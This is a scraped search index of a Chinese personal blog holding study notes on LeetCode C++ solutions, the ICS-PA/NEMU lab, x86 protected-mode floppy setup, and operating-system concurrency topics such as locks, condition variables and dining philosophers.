5 6 7 8 9 10 11 12 13 class Solution { public: bool searchMatrix(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; matrix, int target) { for(int i =0;i\u0026lt;matrix.size();i++){ for(int j=0;j\u0026lt;matrix[i].size();j++){ if(matrix[i][j] == target){ return true; } } } return false; } }; 有序矩阵中第K小的元素 1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution { public: int kthSmallest(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; matrix, int k) { vector\u0026lt;int\u0026gt; rec; for(int i=0;i\u0026lt;matrix.size();i++){ for(int j =0;j\u0026lt;matrix[i].size();j++){ rec.push_back(matrix[i][j]); } } sort(rec.begin(),rec.end()); return rec[k-1]; } }; 寻找重复数 给定一个包含 n + 1 个整数的数组 nums ，其数字都在 [1, n] 范围内（包括 1 和 n），可知至少存在一个重复的整数。\n假设 nums 只有 一个重复的整数 ，返回 这个重复的数 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class Solution { public: int findDuplicate(vector\u0026lt;int\u0026gt;\u0026amp; nums) { int n= nums.size(); int l =1,r=n-1,ans = -1; while(l\u0026lt;=r){ int mid=(l+r)/2; int cnt =0; for(int i=0;i\u0026lt;n;++i){ cnt +=(nums[i]\u0026lt;=mid); } if(cnt\u0026lt;=mid){ l=mid+1; }else{ r=mid-1; ans =mid; } } return ans; } }; 抽屉原理：如果cnt小于等于mid，说明重复数在右半部分，如果cnt大于mid，说明重复数在左半部分\n思考：本来是想sort然后比较，但是要求不能动原数组，数字范围就是1-n，可以把1-n看作一个sort后的数组，这么向就好多了，小于等于mid说明较大的数字偏多，在n/2-n的范围，反之在左边，当r=l时候结束循环\n优美的排列 给你两个整数 n 和 k ，请你构造一个答案列表 answer ，该列表应当包含从 1 到 n 的 n 个不同正整数，并同时满足下述条件：\n假设该列表是 answer = [a1, a2, a3, ... , an] ，那么列表 [|a1 - a2|, |a2 - a3|, |a3 - a4|, ... , |an-1 - an|] 中应该有且仅有 k 个不同整数。 返回列表 answer 。如果存在多种答案，只需返回其中 任意一种 。\n思路：从特殊情况到一般情况\n思路与算法\n当 k=1 时，我们将 1∼n 按照 [1,2,⋯,n] 的顺序进行排列，那么相邻的差均为 1，满足 k=1 的要求。\n当 k=n−1 时，我们将 1∼n 按照 [1,n,2,n−1,3,⋯] 的顺序进行排列，那么相邻的差从 n−1 开始，依次递减 1。这样一来，所有从 1 到 n−1 的差值均出现一次，满足 k=n−1 的要求。\n对于其它的一般情况，我们可以将这两种特殊情况进行合并，即列表的前半部分相邻差均为 1，后半部分相邻差从 k 开始逐渐递减到 1，这样从 1 到 k 的差值均出现一次，对应的列表即为： [1,2,⋯,n−k,n,n−k+1,n−1,n−k+2,⋯]\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution { public: vector\u0026lt;int\u0026gt; constructArray(int n, int k) { vector\u0026lt;int\u0026gt; answer; for(int i=1;i\u0026lt;n-k;++i){ answer.push_back(i); } for(int i=n-k,j=n;i\u0026lt;=j;++i,--j){ answer.push_back(i); if(i!=j){ answer.push_back(j); } } return answer; } }; 注意i!=j，是为了避免相同的元素重复加入数列\n数组的度 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 class Solution { public: int findShortestSubArray(vector\u0026lt;int\u0026gt;\u0026amp; nums) { unordered_map\u0026lt;int,int\u0026gt; left;//记录每个数字第一次出现的位置 unordered_map\u0026lt;int,int\u0026gt; right;//记录每个数字最后一次出现的位置 unordered_map\u0026lt;int,int\u0026gt; counter;//统计每个数字出现的次数 int degree = 0; for(int i=0;i\u0026lt;nums.size();i++){ if(!left.count(nums[i])) left[nums[i]]=i; right[nums[i]]=i; counter[nums[i]] ++; degree = max(degree,counter[nums[i]]); } int res = nums.size(); for(auto\u0026amp;kv:counter){//kv是counter中元素的引用，就是遍历counter键值对 if(kv.second == degree){ res = min(res,right[kv.first]-left[kv.first]+1);//kv.keft是数字，kv.right是出现次数 } } return res; } }; 思路：先找数组的度，degree等于counter.values()的最大值，用left和right保存了每个元素再数组中第一次出现的位置和最后一次的位置，字典中所有value的最大值就是数组的度；再求与原数组相同度的最短子数组，那么出现次数最多的元素第一次和最后一次出现的位置确定\n","date":"2025-03-21T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/","title":"数据结构与算法"},{"content":"Unix is a user-friendly. It\u0026rsquo;s just selective about who its friends are.\nUnix哲学 KISS：Keep it simple,stupid.\nEverything is a file and pipeline programs to work together.\n每个工具只做一件事情，但做到极致\n小工具统一文本输入输出，易于使用\n使用管道进行组合\nman -k xxx 检索关键字XXX的命令\necho $?查看上一条指令的退出状态\ngcc -E -S -c -o\n.c -\u0026gt; .i -\u0026gt; .s -\u0026gt; .o -\u0026gt; .out\n元编程：定义自己的语言，但是不破坏可读性\n函数的调用就是栈的生长\n.o -\u0026gt; .out就是重定向的过程，.o不知道所调用函数位置，链接后填入函数地址会有偏移\nC程序执行的两个视角\n静态：C 代码的连续一段总能对应到一段连续的机器指令 动态：C 代码执行的状态总能对应到机器的状态 Segmentation fault报错：已超过这块内存允许的权限来操作\n大多数机器采用小端，容易对齐\nlong在32位上是4个字节，在64位是8个字节\n只要是个指针，32位机就是4个字节，64位就是8个字节，指针在内存中的存储是个地址\n1 void (*signal (int sig, void (*func)(int)))(int); 参数为(int sig, void (*func)(int)),*函数返回值，为int型\n拿到项目后 make构建\nmake run跑一下\n看看Makefile怎么构建的\n大致了解下项目总体结构\ntree find \u0026hellip; | xargs cat | wc –l 将find找到的文件列表传给cat，cat依次读取文件内容，wc -l统计所有文件的总行数\n1 find . -name \u0026#34;*.c\u0026#34; -o -name \u0026#34;*.h\u0026#34; | xargs cat | wc -l 266807\n找到入口点main\n1 grep -n main $(find . -name \u0026#34;*.c\u0026#34;) 1 grep -nr \u0026#34;\\bmain\\b\u0026#34; nemu/src 正则表达式，main以单词形式出现\nvim $(fzf)可以以树的方式直接跳转某个文件\n(gdb)layout src :打开源码\n两种运行方式\nmake run ./build/riscv32-nemu-interpreter 怎么给nemu传指令\necho \u0026lsquo;help\u0026rsquo; | ./build/riscv32-nemu-interpreter cat in.txt | ./build/riscv32-nemu-interpreter ./build/riscv32-nemu-interpreter \u0026lt; in.txt 回归测试的脚本？\nparse_args()函数，解析命令行参数\n1 2 3 4 5 6 7 8 9 10 static int parse_args(int argc, char *argv[]) { const struct option table[] = { {\u0026#34;batch\u0026#34; , no_argument , NULL, \u0026#39;b\u0026#39;}, {\u0026#34;log\u0026#34; , required_argument, NULL, \u0026#39;l\u0026#39;}, {\u0026#34;diff\u0026#34; , required_argument, NULL, \u0026#39;d\u0026#39;}, {\u0026#34;port\u0026#34; , required_argument, NULL, \u0026#39;p\u0026#39;}, {\u0026#34;help\u0026#34; , no_argument , NULL, \u0026#39;h\u0026#39;}, {0 , 0 , NULL, 0 }, }; int o; static\n如果在两个文件里定义了重名的函数，能够分别百衲衣，但链接会出错，加了一个static，约束可见的范围，使不会触发函数得重名，nemu框架得逻辑：只要是函数就加static\n/riscv32/**/reg.h\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #ifndef __RISCV_REG_H__ #define __RISCV_REG_H__ #include \u0026lt;common.h\u0026gt; static inline int check_reg_idx(int idx) { IFDEF(CONFIG_RT_CHECK, assert(idx \u0026gt;= 0 \u0026amp;\u0026amp; idx \u0026lt; MUXDEF(CONFIG_RVE, 16, 32))); return idx; } #define gpr(idx) (cpu.gpr[check_reg_idx(idx)]) static inline const char* reg_name(int idx) { extern const char* regs[]; return regs[check_reg_idx(idx)]; } #endif ​\n运行时间短，但是调用频繁，static inline int建议编译器用内联函数的方式展开，不调用函数，而是在调用点直接展开，以空间换时间\nmonitor.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 void init_monitor(int argc, char *argv[]) { /* Perform some global initialization. */ /* Parse arguments. */ parse_args(argc, argv); /* Set random seed. */ init_rand(); /* Open the log file. */ init_log(log_file); /* Initialize memory. */ init_mem(); /* Initialize devices. */ IFDEF(CONFIG_DEVICE, init_device()); /* Perform ISA dependent initialization. */ init_isa(); /* Load the image to memory. This will overwrite the built-in image. */ long img_size = load_img(); /* Initialize differential testing. */ init_difftest(diff_so_file, img_size, difftest_port); /* Initialize the simple debugger. */ init_sdb(); IFDEF(CONFIG_ITRACE, init_disasm()); /* Display welcome message. */ welcome(); } 人机交互，以默认行缓冲的方式交互，没有换行符是不会进行I/O交互，每读到一个换行符\\n，就会释放缓冲区\n**/debug.h\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include \u0026lt;common.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;utils.h\u0026gt; #define Log(format, ...) \\ _Log(ANSI_FMT(\u0026#34;[%s:%d %s] \u0026#34; format, ANSI_FG_BLUE) \u0026#34;\\n\u0026#34;, \\ __FILE__, __LINE__, __func__, ## __VA_ARGS__) #define Assert(cond, format, ...) \\ do { \\ if (!(cond)) { \\ MUXDEF(CONFIG_TARGET_AM, printf(ANSI_FMT(format, ANSI_FG_RED) \u0026#34;\\n\u0026#34;, ## __VA_ARGS__), \\ (fflush(stdout), fprintf(stderr, ANSI_FMT(format, ANSI_FG_RED) \u0026#34;\\n\u0026#34;, ## __VA_ARGS__))); \\ IFNDEF(CONFIG_TARGET_AM, extern FILE* log_fp; fflush(log_fp)); \\ extern void assert_fail_msg(); \\ assert_fail_msg(); \\ assert(cond); \\ } \\ } while (0) #define panic(format, ...) Assert(0, format, ## __VA_ARGS__) #define TODO() panic(\u0026#34;please implement me\u0026#34;) #endif #define assert(cond) if(!(cond)) panic(\u0026hellip;.);\n宏的展开可能会打乱计算的优先级顺序，使用do{}while(0)是为了防止宏展开打破。\nKconfig管理配置宏\n数据的机器级表述 如何取字节？\n如x=0101，要把右边第二位取出来，(x\u0026raquo;1)\u0026amp;1\n再如\n(x\u0026raquo;16)\u0026amp;11111111\n就是丢掉不用的位\n交换高/低16位((x \u0026amp; 0xFFFF)\u0026laquo;16)，((x\u0026raquo;16)\u0026amp;0xFFFF)\n测试𝑥 ∈ 𝑆，(S \u0026raquo; x) \u0026amp; 1\n求 𝑆! = 𝑆 ∪ {𝑥}，S | (1 \u0026laquo; x)\n求|S|，S二进制表示有多少个1\n单指令多数据 \u0026amp;，|，~对于整数里的每一个bit来说是独立（并行）的\nBit Set\n任意位，位运算是对所有bit同时完成的，省空间，程序执行中，内存优先级不同，速度不同，对cache的占用比较小\n补码：各位取反末尾加一\nUndefined Behaviour 警惕整数溢出\n移位操作不能超出数据长度\n如果有UB行为，用不同gcc优化行为，输出是不确定的\n如果在试图访问一块内存时，访问到这块内存之外的一块内存，比如数组越界，但是还是在栈上，可能是页的边界读到了值\n编译器优化 -fsanitize\n如何实现在每一次指针访问时，都增加一个断言assert(obj-\u0026gt;low \u0026lt;= ptr \u0026amp;\u0026amp; ptr \u0026lt; obj-\u0026gt;high);\n1 gcc –fsanitize=undefined a.c \u0026amp;\u0026amp; ./a.out ABI和内联汇编 机器字长式处理器能够直接进行整数或者位运算大小，代表一个指针最多多少位\n现在处理器一般实现48bit物理地址\n晶体管是以数字逻辑电路形式，logic units组成计算单元，\u0026hellip;.，包含在ALU中，汇编器如何翻译，硬件如何解读01串，要遵循ISA协议\nQA：只要有ISA协议真的足够了吗？\n需要ABI\n约定binary的行为\n二进制文件的格式 函数调用，系统调用，如printf需要借助外部的库函数，如libc 链接，加载 cdecl函数调用 caller stack frame\n所有参数都以数组的形式保存在堆栈上，例子，反序压栈，f(x,y)，y,x,f从高地址到低地址 返回地址 跳转到callee 调用方寄存器%eax,%ebx,%ecd,被调用方寄存器%edi，先存下来，函数退出时要恢复调用前的值，调用方负责反序压栈，被调用方负责执行就行\nOS，栈，\u0026hellip;\u0026hellip;，堆，data，代码，\nPC指向代码块\n在X86上，寄存器数量有限，基于栈传参\n使用寄存器传递参数：rdi,rsi,rdx,rcx,r8,r9\ncallee可以随意修改这6个寄存器的值 编译器有了更大的调度空间 交换两个指针指向的数字\nI/O设备 设备=一组寄存器，每次可以交换一定数量的数据\n设备-处理器接口\nCPU通过PMIO.PIO访问\nPort-mapped I/O (PMIO) //很老的做法\nCPU和内存地址分离？\n• I/O地址空间（port） • CPU直连I/O总线\nMemory-mapped I/O(MMIO)\n直观:使用普通内存读写指令 带来一些设计和实现的麻烦，编译器优化，乱序执行 80s如何打印？\n不是发送数据，而是执行指令\n两个特殊的I/O设备 总线\nPCI总线协议 CPU连接总线 总线连接其他总线 中断控制器\n中断设计是为了弥补I/O设备的速度缺陷\n管理多个产生中断的设备\n汇总成一个中断信号给CPU\n支持中断的屏蔽，优先级管理等\n中断=硬件驱动的函数调用，相当于在每条语句后都插入intterrupt_handler();\n栈和堆之间的空闲区域做文件映射，l.bc.so,map系统调用映射同步\n中断，从用户态切换到内核态，同一个CPU上可以做不同任务，多线程\n进程=分时多线程+虚拟存储\n链接与加载 0001 0100 jmp 0100 ;如果发生偏移怎么办？\n0001 0000 jmp foo;借助符号表跳转，模块化好\n复习一下ELF文件？ 可重定位目标文件 • ELF 头 定义了ELF魔数、版本、小端/大端、操作系统平台、目标文件的类型、机器结构类型、节头表的起始位置和长度等 • .text 节 编译汇编后的代码部分 • .rodata 节 只读数据，如 printf 格式串、switch 跳转表等 • .data 节 已初始化且初值不为0的全局/静态变量 • .bss 节 未初始化或初值为0的全局/静态变量，仅是占位符，不占任何实际磁盘空间。区分bss节是为了空间效率\nQA:为什么bss节不占任何实际磁盘空间？\n只有在运行的时候才会在栈上分配空间去用，不被其他外部文件所访问\nQA：为什么要把程序和指令分开放？\n指令cache可执行不可读不可写，数据cache可读/可写 数据会很多次覆盖，但是指令不会被反复覆盖，下次再次缓存命中，不会因为数据覆盖而指令cache清空 符号解析和重定位 • 确定标号引用关系 • 如何填空？\n因为小端法，y的地址0x2ea5+116f\nstatic链接\n按照相同文件把三个locatable文件组合，外部符号 QA：能否直接用ld链接，如ld a.o b.o?\n不行，没有链接标准库，找不到_start,main等函数\n跑一个.out文件？\n分配一个进程内存，可执行文件与虚拟地址空间间的存储器映像由ABI规范定义\n为什么要动态链接？去掉-fno-pic和static\n占用空间更小\n只用维护表就行\nGOT表 call *table[PRINTF]\n延迟绑定使用PLT表有什么好处？ 只有调用到的函数，才去回填跳转\n1 2 3 4 printf@plt: jmp *table[PRINTF] push $PRINTF call resolve 中断与分时多任务 QA：while(1);是否会把电脑卡死？\n类似于call指令？发生中断处理，再返回ret\n中断处理\n自动保存RIP,CS,RFLAGS,RSP,SS,Error Code 根据中断/异常好跳转到处理程序，特权级切换回触发堆栈切换 int $0x80可以产生128号异常，主动唤起中断\n时钟，键盘32号中断（IDT）\nCLI:Clear Interrupt Flag 关中断，不是给低权限用的，\n系统调用，打断点，int指令都是程序内部引发异常\n一类是可处理，最终还得回到中断发生处next PC，保存现场，恢复现场（分时多任务，时钟中断都是这种）\n而不可恢复的，程序出错，触发ERROR CODE0\nQA:保存现场，恢复现场 什么值？\n","date":"2025-03-17T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/ics-pa%E7%AC%94%E8%AE%B0/","title":"ICS-PA笔记"},{"content":"由于引导区空间有限，只有512个字节，故打算把程序编译成com文件，然后让DOS执行\n1 nasm pmtest1.asm -o pmtest1.com 一些挂载问题：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 1、写入空白内容： dd if=/dev/null of=pm.img bs=512 count=1 conv=notrunc 2、使用 losetup 命令，将 data.img 作为 loop device 使用： sudo losetup /dev/loop0 pm.img 3、然后，格式化这个 loop device： sudo mkfs.msdos /dev/loop0 4、检查文件系统： sudo fsck.msdos /dev/loop0 5、删除 loop device： sudo losetup -d /dev/loop0 这时候，pm.img 已经格式化完成，可以作为一个软盘镜像使用。用file查看，结果为： pm.img: DOS floppy 1440k, x86 hard disk boot sector 再次输入 sudo mount -o loop pm.img /mnt/floppy 6、挂载成功！！！ 之后正常挂在就行\n1 2 3 sudo cp pmtest1.com /mnt/floppy(先要在创建挂载文件夹，Ubuntu好像没有软盘驱动，中途换kali去了，也是基于Debian) sudo umount /mnt/floppy 保护模式 从实模式跳转到保护模式\n1.准备GDT（全局描述符表）\n2.用lgdt加载gdtr\n1 lgdt [GdtPtr] 3.打开A20,，试图访问到1MB上的内存\n4.设置cr0的PE位，0变1\n5.跳转，进入保护模式\n1 jmp dword SelectorCode32:0 跳转目标是描述符DESC——CODE32对应段的首地址，即标号LABEL_SEG_CODE32处\nP位，p=1表示段在内存中存在，p=0表示段在内存中不存在\nDPL描述符特权级，特权级可以是0，1，2，3，数字越小特权级越大\nS位，数据段/代码段描述符，系统段/门描述符\n在保护模式下执行汇编代码mov ds:[si], ax的大致步骤如下：\n首先CPU需要查找GDT在内存中位置，GDT的位置从GDTR寄存器中直接获取 然后根据DS寄存器得到目标段描述符的物理地址 计算出描述符中的段基址的值加上SI寄存器存储的偏移量的结果，该结果为目标物理地址 将AX寄存器中的数据写入到目标物理地址\nC程序的状态机模型 状态=堆+栈\n初始状态=main()的第一条语句\n迁移=执行一条简单语句\n状态机，取指令，执行\n复习下gdb调试，大多数都快忘光了\npwngdb调试：start;b \u0026lt;断点\u0026gt;；r;layout asm(二进制调试);si执行一条指令；x $rbp;si;rbp寄存器值改变；wa $rax监控断点\n程序？\n程序是一个状态机，初始状态：如果没有指定，从PC开始执行，线性，分叉（如rand），程序执行的结果不是唯一的\n一条特殊的指令syscall(),进入内核模式，把\u0026hellip;.交给操作熊，任其修改，程序=计算+syscall()\n如何写一个最小的hello，world程序?\n强行编译+链接\nld失败，把main改成_start\n但是Segmentation Fault，retq就是把rsp加8，调试发现是初始状态无法返回\n解决办法：syscall\n1 2 3 4 5 #include \u0026lt;sys/syscall.h\u0026gt; int main() { syscall(SYS_exit, 42); } man syscall\n系统调用参数，如在x86-64，syscall放在rax,rax,rdx，终于明白pwn的payload如何构造了\n一些有趣的终端命令\n1 2 3 4 5 telnet towel.blinkenlights.nl 放电影 dialog --msgbox \u0026#39;Hello\u0026#39; 8 32 ssh sshtron.zachlatta.com(贪吃蛇) 编译器 c代码状态机（有些地方不可优化，如系统调用是不可优化的），汇编代码状态机，如何切换?\nC=compile(S)\n正确的编译？把C代码中不可优化的部分都被正确的翻译到汇编上\nxxd:Linux查看二进制代码\n常见应用程序 程序是状态机视角\nGNU Coreutils/busybox -\u0026gt;系统/工具程序(apt,ssh,vim) ——\u0026gt;应用程序\nQA：Hello World C程序执行的第一条指令在哪里?\n/lib64/ld-linux-x86-64.so\n可以自行修改哈\n1 2 3 4 5 6 strace追踪 strace f.out strace -f gcc -c f.c gcc --verbose 并发 Human beings are sequential agents\n单线程每一步都是确定的\n多线程：全局变量和堆区共享，有几个独立的栈帧链，线程：每个栈帧里都有PC和其他局部变量，并发系统每一步都不确定，switch选择线程1/2/3\u0026hellip;\u0026hellip;?\nHuman beings are sequential creature.\ntop显示CPU使用情况\n是不是线程共存内存？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026#34;thread.h\u0026#34; int x = 0; void Thello(int id) { usleep(id * 100000); printf(\u0026#34;Hello from thread #%c\\n\u0026#34;, \u0026#34;123456789ABCDEF\u0026#34;[x++]); } int main() { for (int i = 0; i \u0026lt; 10; i++) { create(Thello); } } 改变int x=0局部or全局，可以看到不一样的输出\n如何证明线程具有独立堆栈？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include \u0026#34;thread.h\u0026#34; __thread char *base, *cur; // thread-local variables __thread int id; // objdump to see how thread-local variables are implemented __attribute__((noinline)) void set_cur(void *ptr) { cur = ptr; } __attribute__((noinline)) char *get_cur() { return cur; } void stackoverflow(int n) { set_cur(\u0026amp;n); if (n % 1024 == 0) { int sz = base - get_cur();//栈底和栈顶区别 printf(\u0026#34;Stack size of T%d \u0026gt;= %d KB\\n\u0026#34;, id, sz / 1024); } stackoverflow(n + 1);//无限制的创建栈 } void Tprobe(int tid) { id = tid; base = (void *)\u0026amp;tid; //指向tid地址 stackoverflow(0); } int main() { setbuf(stdout, NULL); for (int i = 0; i \u0026lt; 4; i++) { create(Tprobe); } } 多线程执行，同时访问相同的共享变量，会出问题\n原子性的丧失 如何把程序限制到单处理器上？\n单处理器多线程\n线程在运行时可能被中断，切换到另一个线程执行 多处理器多线程\n线程根本就是并行执行的 printf还能在多线程调用吗？\nprintf不会在多线程中出现问题，比如一个字符插入另一个字符，因为有缓冲区，不是puts\nasm volatile(\u0026quot;\u0026quot;:::\u0026ldquo;memory\u0026rdquo;)插入汇编指令，告诉汇编器不要优化，别的线程可能读写内存\n并发程序最大的麻烦？\nmem-ordering.c\nflag=0或1，通过异或算法，来决定执行哪个\n1 ./mem-ordering |head -n 10000 |sort |uniq -c 现代处理器 动态编译器\n单个处理器把汇编代码编译成更小的uops\nfetch-\u0026gt;issue（可以同时）-\u0026gt;execuite-\u0026gt;commit\n在任何时刻，处理器都维护一个uop的池子，每一周期向池子补充尽可能多的uop，执行尽可能多的uop，这也是乱序执行的原因\n多处理器间即使可见性的丧失\n如果写x发生cache miss，延迟写入，执行下一条指令\n“mfence”保证多处理器之间的一致性，只有写入内存，才能执行下一条语句\n总结 并发程序=多个执行流，共享内存的状态机，c语言执行流\nthread.h=create+join\n并发执行不原子，能乱序。不立即可见\n现代处理器就是动态数据分析器，指令流，数据流，只要做出相应的应对，就能跑的快\n互斥：保证两个线程不能同时执行一段代码\n利用锁，互斥锁，同一时间只有一个线程持有锁，线程在进入临界区前必须先获取锁，线程在离开临界区后必须释放锁，必须确保同一时间只有一个线程能狗执行临界区代码\nPeterson算法 store()改变状态，赋值\nload()看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int x = 0, y = 0, turn = A; void TA() { while (1) { /* PC=1 */ x = 1; /* PC=2 */ turn = B; /* PC=3 */ while (y \u0026amp;\u0026amp; turn == B) ; critical_section(); /* PC=4 */ x = 0; } } void TB() { while (1) { /* PC=1 */ y = 1; /* PC=2 */ turn = A; /* PC=3 */ while (x \u0026amp;\u0026amp; turn == A) ; critical_section(); /* PC=4 */ y = 0; } } QA：如何保证两个人能安全的上厕所，只有store（）和load()两个动作？\n模拟算法（PC1,PC2,X,Y,turn）\nmodef-checker.py\n不断试图进入临界区，只要变量是锁着的，就执行死循环，如果不是，就锁上，进入临界区，出临界区，把锁删掉\n在共享内存上实现互斥 实现互斥的根本困难：公理系统不允许同时读/写共享内存，即load()和store()不能同时执行\n解决：假设硬件能为我们提供一条“瞬间完成”的读写指令\n实现互斥的协议？\n一条exchange协议，0/1状态转变\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 int table =yes; void lock(){ retry: ​ int got = xchg(\u0026amp;table,NOPE); ​ if (got == NOPE) ​ goto retry; ​ assert(got == YES); } void unlock(){ ​ xchg(\u0026amp;table,YES) } int locked =0; void lock(){while (echg(\u0026amp;locked,1));} void unlock(){xchg(\u0026amp;locked,0);} 注意model-checker工作的检验\n原子指令的模型 保证lock指令有顺序并能按顺序执行，后面的线程能看见前面的线程，保证之前的store都写入内存，保证load/store不与原子指令乱序\natomic test-and-set\nlock xchg\nreg=load(x);if (reg==XX){store(x,XX)}\nlock add\nt=load(x);t++;store(x,t)\n一读一写\nload,exec,store\nLOAD-Reserved/Store-Conditional 打标记\n1 2 3 4 5 6 int cas(int *addr, int cmp_val, int new_val) { int old_val = *addr; if (old_val == cmp_val) { *addr = new_val; return 0; } else { return 1; } } 自旋锁的缺陷 每个CPU上不同线程，可以切换，除了进入临界区的线程，其他处理器上的线程都在空转，获得自旋锁的线程可能被操作系统切换出去\n自旋 (共享变量) 会触发处理器间的缓存同步，延迟增加\n同一份计算任务，时间 (CPU cycles) 和空间 (mapped memory) 会随处理器数量的增长而变化。\n自旋锁的好处 更快的 fast path xchg 成功 → 立即进入临界区，开销很小 更慢的 slow path xchg 失败 → 浪费 CPU 自旋等待 自旋锁的使用场景\nno：\n持有自旋锁时禁止执行流切换(很危险的操作)？ 临界区几乎不拥堵？ 操作系统可以操纵关中断和抢占，保证锁的持有者在很短的时间呢你可以释放锁\n如何实现一个很长的临界期？\n把锁的实现放到操作系统里就好啦！\n1 syscall(SYSCALL_lock, \u0026amp;lk); 试图获得 lk，但如果失败，就切换到其他线程 1 syscall(SYSCALL_unlock, \u0026amp;lk); 释放 lk，如果有等待锁的线程就唤醒 融合自旋锁和互斥锁的好处？\nFutex Fast path: 一条原子指令，上锁成功立即返回\nSlow path: 上锁失败，执行系统调用睡眠\n线程库里的锁绝大情况下不会启动系统调用，而是原子调用\n总结 QA：如何在多处理器上实现互斥？\n在多处理器系统上实现互斥是确保多个处理器或核心在访问共享资源时不会发生冲突的关键，利用锁\n并发控制 QA:如何在多处理器上协同多个线程完成任务？\n同步：两个或两个以上随时间变化的量在变化过程中保持一定的相对关系\n并发程序中的同步：在某个时间点共同达到互相已知的状态\n生产者-消费者问题 括号匹配\n左括号：生产资源，放入队列\n右括号：从队列取出资源执行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include \u0026#34;thread.h\u0026#34; #include \u0026#34;thread-sync.h\u0026#34; int n, count = 0; mutex_t lk = MUTEX_INIT(); void Tproduce() { while (1) { retry: mutex_lock(\u0026amp;lk); if (count == n) { mutex_unlock(\u0026amp;lk); goto retry; } count++; printf(\u0026#34;(\u0026#34;); mutex_unlock(\u0026amp;lk); } } void Tconsume() { while (1) { retry: mutex_lock(\u0026amp;lk); if (count == 0) { mutex_unlock(\u0026amp;lk); goto retry; } count--; printf(\u0026#34;)\u0026#34;); mutex_unlock(\u0026amp;lk); } } int main(int argc, char *argv[]) { assert(argc == 2); n = atoi(argv[1]); setbuf(stdout, NULL); for (int i = 0; i \u0026lt; 8; i++) { create(Tproduce); create(Tconsume); } } 如果不为空，就取出右括号执行，如果不满，就放左括号\n改进，join()阻塞进程直至线程完成\nConditional Variables 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026#34;thread.h\u0026#34; #include \u0026#34;thread-sync.h\u0026#34; int n, count = 0; mutex_t lk = MUTEX_INIT(); cond_t cv = COND_INIT(); void Tproduce() { while (1) { mutex_lock(\u0026amp;lk); if (count == n) { cond_wait(\u0026amp;cv, \u0026amp;lk); } printf(\u0026#34;(\u0026#34;); count++; cond_signal(\u0026amp;cv); mutex_unlock(\u0026amp;lk); } } void Tconsume() { while (1) { mutex_lock(\u0026amp;lk); if (count == 0) { pthread_cond_wait(\u0026amp;cv, \u0026amp;lk); } printf(\u0026#34;)\u0026#34;); count--; cond_signal(\u0026amp;cv); mutex_unlock(\u0026amp;lk); } } int main(int argc, char *argv[]) { assert(argc == 2); n = atoi(argv[1]); setbuf(stdout, NULL); for (int i = 0; i \u0026lt; 8; i++) { create(Tproduce); create(Tconsume); } } 两个消费者，一个生产者，什么时候会出现问题，应该是一个consumer在不该wakeup的时候？())同类唤醒\nassert()检查\n获取互斥锁，如果不满足条件，则调用cond_wait进入等待状态，并释放互斥锁，满足条件执行后，释放锁，cond_signal()唤醒另一个进程\n哲学家吃饭问题 吃饭需要同时得到左手和右手的叉子 当叉子被其他人占有时，必须等待，如何完成同步？ 如何用互斥锁/信号量实现？ 失败的尝试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include \u0026#34;thread.h\u0026#34; #include \u0026#34;thread-sync.h\u0026#34; #define N 3 sem_t locks[N]; void Tphilosopher(int id) { int lhs = (N + id - 1) % N; int rhs = id % N; while (1) { P(\u0026amp;locks[lhs]); //上锁，得到叉子 printf(\u0026#34;T%d Got %d\\n\u0026#34;, id, lhs + 1); P(\u0026amp;locks[rhs]); printf(\u0026#34;T%d Got %d\\n\u0026#34;, id, rhs + 1); V(\u0026amp;locks[lhs]); V(\u0026amp;locks[rhs]); } } int main(int argc, char *argv[]) { for (int i = 0; i \u0026lt; N; i++) { SEM_INIT(\u0026amp;locks[i], 1);//初始化为1 } for (int i = 0; i \u0026lt; N; i++) { create(Tphilosopher); } } 问题：死锁？\n分布式算法：如果所有人叉子都在右手上，没有人叫醒程序，线程不会进展\n1 2 3 4 5 6 7 8 9 10 11 mutex_lock(\u0026amp;mutex); while (!(avail[lhs] \u0026amp;\u0026amp; avail[rhs])) { wait(\u0026amp;cv, \u0026amp;mutex); } avail[lhs] = avail[rhs] = false; //放下两个叉子 mutex_unlock(\u0026amp;mutex); mutex_lock(\u0026amp;mutex); avail[lhs] = avail[rhs] = true; broadcast(\u0026amp;cv); mutex_unlock(\u0026amp;mutex); Master-slave：让一个人管理叉子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 void Tphilosopher(int id) { send_request(id, EAT); P(allowed[id]); // waiter 会把叉子递给哲学家 philosopher_eat(); send_request(id, DONE); } void Twaiter() { while (1) { (id, status) = receive_request(); if (status == EAT) { ... } if (status == DONE) { ... } } } 延伸思考，如果觉得单线程管理太慢，可以分批给多个线程管理，但这些现成的管理资源要独立\n防御性编程 利用assert()\n1 2 3 